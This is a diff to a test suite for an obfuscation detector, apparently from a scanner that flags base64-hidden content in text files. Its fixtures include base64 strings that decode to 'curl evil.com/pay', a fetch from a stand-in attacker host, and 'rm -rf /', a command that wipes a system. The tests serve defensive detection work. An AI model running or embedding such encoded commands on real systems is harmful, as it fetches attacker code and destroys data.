@@ -117,8 +117,7 @@ describe("detectMarkdownHiding", () => {
 });
 
 describe("detectObfuscation", () => {
-  test("detects base64 blocks", () => {
-    // 60+ chars of valid base64
+  test("detects long base64 blocks", () => {
     const b64 =
       "SGVsbG8sIHRoaXMgaXMgYSBiYXNlNjQgZW5jb2RlZCBzdHJpbmcgZm9yIHRlc3Rpbmcu";
     const content = `Encoded data: ${b64}`;
@@ -129,8 +128,34 @@ describe("detectObfuscation", () => {
     expect(base64Match.decoded).toBeDefined();
   });
 
-  test("does not flag short base64-looking strings", () => {
-    const content = "Token: abc123XYZ"; // too short
+  test("detects short base64 blocks (20+ chars)", () => {
+    const content = "Payload: Y3VybCBldmlsLmNvbS9wYXk="; // "curl evil.com/pay"
+    const matches = detectObfuscation(content);
+    expect(matches.some((m) => m.category === "Base64 block")).toBe(true);
+  });
+
+  test("detects padded short base64 (10-19 chars)", () => {
+    const content = "Run: cm0gLXJmIC8="; // "rm -rf /" (12 base chars + padding)
+    const matches = detectObfuscation(content);
+    expect(matches.some((m) => m.category === "Base64 block")).toBe(true);
+    const b64 = matches.find((m) => m.category === "Base64 block");
+    expect(b64?.decoded).toContain("rm -rf /");
+  });
+
+  test("detects short base64 with digits (heuristic)", () => {
+    const content = "Load: aW1wb3J0IG9z"; // "import os" (12 chars, has digits)
+    const matches = detectObfuscation(content);
+    expect(matches.some((m) => m.category === "Base64 block")).toBe(true);
+  });
+
+  test("does not flag normal English words", () => {
+    const content = "TypeScript conventions and indentation rules";
+    const matches = detectObfuscation(content);
+    expect(matches.some((m) => m.category === "Base64 block")).toBe(false);
+  });
+
+  test("does not flag camelCase identifiers", () => {
+    const content = "Use addEventListener to handle click events";
     const matches = detectObfuscation(content);
     expect(matches.some((m) => m.category === "Base64 block")).toBe(false);
   });
